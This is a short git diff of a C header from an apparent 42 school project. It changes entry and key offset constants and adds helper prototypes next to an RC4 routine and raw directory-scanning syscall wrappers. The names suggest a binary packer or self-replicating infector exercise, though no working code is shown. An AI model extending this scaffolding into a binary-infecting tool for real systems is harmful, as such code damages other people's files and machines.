@@ -6,7 +6,7 @@
 /*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/03/12 18:26:41 by ddinaut           #+#    #+#             */
-/*   Updated: 2019/03/31 21:21:46 by ddinaut          ###   ########.fr       */
+/*   Updated: 2019/04/02 00:39:18 by ddinaut          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -38,8 +38,8 @@
 # define BUFF_SIZE	0x1000
 # define PROG_INFO	512
 
-# define ENTRY_OFF	2161
-# define KEY_OFF	85
+# define ENTRY_OFF	2497
+# define KEY_OFF	28
 
 # define __INLINE__	__attribute__((always_inline)) inline
 
@@ -135,10 +135,12 @@ bool			generate_key(uint8_t *key, size_t size);
 **	Lib
 */
 void			_rc4(const unsigned char *key, const size_t key_length, uint8_t *data, const size_t data_length);
+int				_memcmp(const void *s1, const void *s2, size_t n);
 void			*_memcpy(void *d, void *s, size_t size);
 void			*_memset(void *b, int c, size_t len);
 int				_strncmp(char *s1, char *s2, size_t n);
 size_t			_strlen(char *s);
+bool			check_name(char *str, int len);
 void			__exit(int status);
 int				_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
 int				_open(const char *path, int flags, mode_t mode);
